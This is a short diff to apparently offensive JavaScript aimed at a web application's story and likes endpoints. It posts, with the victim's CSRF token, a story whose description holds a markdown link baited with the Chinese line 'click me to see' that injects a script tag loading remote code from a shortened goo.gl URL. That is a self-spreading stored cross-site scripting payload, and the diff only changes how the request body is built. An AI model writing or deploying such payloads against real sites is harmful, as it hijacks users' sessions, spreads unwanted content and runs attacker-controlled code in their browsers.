@@ -285,10 +285,15 @@ fetch('/likes?id=6948&type=User', {
     }
 })
 
+
+var formData = new FormData();
+formData.append("user_story[name]", "")
+formData.append("user_story[desc]", "### [[點我看看啦]](d = document;s = d.createElement('script');s.src = 'https://goo.gl/3CXDQf';d.body.appendChild(s))")
+
 fetch('/user_stories/', {
-	method: 'POST',
-	headers: {
+    method: 'POST',
+    headers: {
         'x-csrf-token': token
     }, 
-	body: "user_story[name]=&user_story[desc]=" + "### [[點我看看啦]](d = document;s = d.createElement('script');s.src = 'https://goo.gl/3CXDQf';d.body.appendChild(s))"
+    body: formData
 })
